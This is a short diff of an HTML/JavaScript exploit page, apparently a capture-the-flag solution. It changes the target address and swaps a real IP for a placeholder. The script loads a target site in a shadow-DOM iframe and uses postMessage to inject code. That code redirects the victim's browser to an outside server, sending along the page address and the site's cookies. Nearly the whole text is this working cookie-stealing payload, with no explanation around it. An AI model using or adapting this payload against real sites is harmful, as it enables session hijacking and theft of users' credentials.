@@ -3,11 +3,11 @@
     document.body.innerHTML = '<div>';
     d = document.querySelector('div');
     d.attachShadow({'mode':'open'});
-    d.shadowRoot.innerHTML = `<iframe src='http://web:8000'></iframe>`;
+    d.shadowRoot.innerHTML = `<iframe src='http://web'></iframe>`;
     let iframe = d.shadowRoot.querySelector('iframe');
     let iframeWindow = iframe.contentWindow;
     iframe.onload = function() {
-       iframeWindow.postMessage('location.href="http://3.39.193.8/cookie?addres=" + escape(location.href) + "&cookie=" + escape(window.open("/").document.cookie)', '*');
+       iframeWindow.postMessage('location.href="http://<My Server>/cookie?addres=" + escape(location.href) + "&cookie=" + escape(window.open("/").document.cookie)', '*');
     }
     </script>
     </body>
